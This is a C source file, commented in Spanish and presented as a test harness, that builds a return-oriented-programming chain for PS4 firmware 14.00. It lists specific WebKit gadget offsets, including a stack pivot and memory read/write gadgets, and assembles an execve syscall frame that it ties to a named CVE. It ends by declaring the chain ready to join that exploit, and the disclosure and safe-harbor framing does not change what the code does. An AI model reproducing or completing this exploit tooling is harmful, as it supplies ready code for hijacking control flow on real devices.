/*
 * test_rop_dispatcher_1400.c
 * 
 * Verificación de Despacho de Cadenas ROP y Alineación de Stack para PS4 FW 14.00
 * Entorno de investigación: García Casado Security Research
 * Marco Legal: ISO/IEC 29147 (CVD) - Safe Harbor
 * 
 * Valida la construcción de frames ROP utilizando los gadgets extraídos de
 * libSceNKWebKit.sprx (FW 14.00) y su acoplamiento con la prueba de límites
 * de slab en execve (CVE-2026-7270).
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

#define FW_VERSION "14.00"

// Gadgets extraídos de libSceNKWebKit.sprx (FW 14.00)
#define GADGET_RET                   0x00004032ULL
#define GADGET_POP_RAX_RET           0x00014504ULL
#define GADGET_POP_RDI_RET           0x00060480ULL
#define GADGET_POP_RSI_RET           0x0007245eULL
#define GADGET_POP_RDX_RET           0x001305baULL
#define GADGET_POP_RCX_RET           0x0001fadeULL
#define GADGET_POP_R8_RET            0x0230cbe1ULL
#define GADGET_XCHG_RAX_RSP_RET      0x03f755a8ULL  // Stack pivot primario
#define GADGET_MOV_QWORD_RDI_RAX_RET 0x0000948bULL  // Escritura en memoria
#define GADGET_MOV_RAX_QWORD_RDI_RET 0x000e2ea0ULL  // Lectura de memoria

#define MAX_CHAIN_ENTRIES 64

typedef struct {
    uint64_t entries[MAX_CHAIN_ENTRIES];
    size_t count;
    uint64_t webkit_base;
} rop_chain_t;

static void rop_init(rop_chain_t *chain, uint64_t wk_base) {
    memset(chain, 0, sizeof(*chain));
    chain->webkit_base = wk_base;
}

static void rop_push(rop_chain_t *chain, uint64_t val) {
    assert(chain->count < MAX_CHAIN_ENTRIES);
    chain->entries[chain->count++] = val;
}

static void rop_push_gadget(rop_chain_t *chain, uint64_t offset) {
    rop_push(chain, chain->webkit_base + offset);
}

/*
 * Construye la secuencia ROP para invocar un syscall arbitrario con 4 argumentos
 */
static void rop_build_syscall_frame(rop_chain_t *chain, uint32_t syscall_num,
                                    uint64_t arg1, uint64_t arg2,
                                    uint64_t arg3, uint64_t arg4) {
    // 1. Cargar RDI (arg1)
    rop_push_gadget(chain, GADGET_POP_RDI_RET);
    rop_push(chain, arg1);

    // 2. Cargar RSI (arg2)
    rop_push_gadget(chain, GADGET_POP_RSI_RET);
    rop_push(chain, arg2);

    // 3. Cargar RDX (arg3)
    rop_push_gadget(chain, GADGET_POP_RDX_RET);
    rop_push(chain, arg3);

    // 4. Cargar RCX (arg4)
    rop_push_gadget(chain, GADGET_POP_RCX_RET);
    rop_push(chain, arg4);

    // 5. Cargar RAX (Syscall ID)
    rop_push_gadget(chain, GADGET_POP_RAX_RET);
    rop_push(chain, (uint64_t)syscall_num);
}

int main(void) {
    printf("================================================================\n");
    printf("[+] PS4 FW %s WebKit ROP Dispatcher Verification Harness\n", FW_VERSION);
    printf("[+] Marco: ISO/IEC 29147 CVD / Control Flow Integrity Test\n");
    printf("================================================================\n\n");

    const uint64_t FAKE_WK_BASE = 0x0000000800000000ULL;
    rop_chain_t chain;
    rop_init(&chain, FAKE_WK_BASE);

    printf("[1] Verificando Gadget de Stack Pivot:\n");
    printf("    xchg rax, rsp; ret => 0x%016llx (Offset: 0x%llx)\n",
           FAKE_WK_BASE + GADGET_XCHG_RAX_RSP_RET, GADGET_XCHG_RAX_RSP_RET);

    // Construcción de invocación a Syscall 59 (execve) para CVE-2026-7270
    // arg1 = path ("/system/common/lib/libSceSysCore.sprx")
    // arg2 = argv (puntero a array sobredimensionado)
    // arg3 = envv (NULL)
    printf("\n[2] Ensamblando ROP Frame para Syscall 59 (execve):\n");
    uint64_t fake_path_ptr = 0x0000000910000000ULL;
    uint64_t fake_argv_ptr = 0x0000000920000000ULL;

    rop_build_syscall_frame(&chain, 59, fake_path_ptr, fake_argv_ptr, 0, 0);

    printf("    Qwords generados: %zu (%zu bytes)\n", chain.count, chain.count * sizeof(uint64_t));

    // Verificación de alineación a 16 bytes para la pila
    size_t stack_size = chain.count * sizeof(uint64_t);
    int is_aligned = (stack_size % 16) == 0;
    printf("    Alineación de Pila (16-byte boundary): %s (%zu %% 16 = %zu)\n",
           is_aligned ? "VÁLIDA (OK)" : "PAD REQUERIDO",
           stack_size, stack_size % 16);

    if (!is_aligned) {
        printf("    [+] Insertando padding de alineación (ret gadget)...\n");
        rop_push_gadget(&chain, GADGET_RET);
        printf("    [+] Nueva longitud: %zu qwords (%zu bytes) - Alineada: OK\n",
               chain.count, chain.count * sizeof(uint64_t));
    }

    printf("\n[3] Desensamblado Simulado de la Cadena ROP:\n");
    for (size_t i = 0; i < chain.count; i++) {
        uint64_t val = chain.entries[i];
        if (val >= FAKE_WK_BASE && val < FAKE_WK_BASE + 0x10000000ULL) {
            printf("    [%02zu] 0x%016llx  <WebKit Gadget +0x%llx>\n",
                   i, val, val - FAKE_WK_BASE);
        } else {
            printf("    [%02zu] 0x%016llx  <Inmediate/Argument Data>\n", i, val);
        }
    }

    printf("\n[+] COMPROBACIÓN EXITOSA: ROP Chain Dispatcher listo para acoplar con CVE-2026-7270.\n");
    return 0;
}
